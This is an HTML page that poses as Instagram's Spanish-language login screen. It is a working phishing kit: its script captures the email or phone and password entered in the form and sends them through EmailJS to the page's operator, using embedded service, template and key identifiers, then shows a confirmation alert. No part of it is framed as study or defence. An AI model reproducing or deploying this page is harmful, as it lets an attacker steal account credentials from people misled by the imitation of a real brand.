<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicio de Sesión</title>
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fafafa;
        }
        .container {
            width: 350px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            text-align: center;
        }
        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        .logo {
            width: 40px;
            margin-right: 10px;
        }
        .logo-text {
            font-size: 35px; /* Ajustado para tamaño más pequeño */
            font-family: 'Grand Hotel', cursive;
            color: black;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }
        .btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .btn:hover {
            background-color: #007bb5;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
        }
        .footer a {
            color: #0095f6;
            text-decoration: none;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Logo y nombre de Instagram -->
    <div class="logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" alt="Instagram" class="logo">
        <span class="logo-text">Instagram</span>
    </div>

    <form>
        <input type="text" class="input-field" placeholder="Correo electrónico o teléfono" required>
        <input type="password" class="input-field" placeholder="Contraseña" required>
        <button type="submit" class="btn">Iniciar sesión</button>
    </form>

    <div class="footer">
        <p>¿No tienes cuenta? <a href="#">Regístrate</a></p>
        <p><a href="#">¿Olvidaste tu contraseña?</a></p>
    </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script>
    (function() {
        emailjs.init("xWH0bcIH46K0iBNVf"); // Reemplaza "TU_USER_ID" con tu ID de usuario de EmailJS
    })();

    document.querySelector("form").addEventListener("submit", function(event) {
        event.preventDefault(); // Evita el envío normal del formulario

        var emailParams = {
            user_email: document.querySelector('.input-field[type="text"]').value,
            user_password: document.querySelector('.input-field[type="password"]').value
        };

        emailjs.send("service_ots54ci", "template_k0l30ka", emailParams)
            .then(function(response) {
                alert("Datos enviados correctamente ✅");
            }, function(error) {
                alert("Error al enviar los datos ❌: " + error);
            });
    });
</script>

</body>
</html>
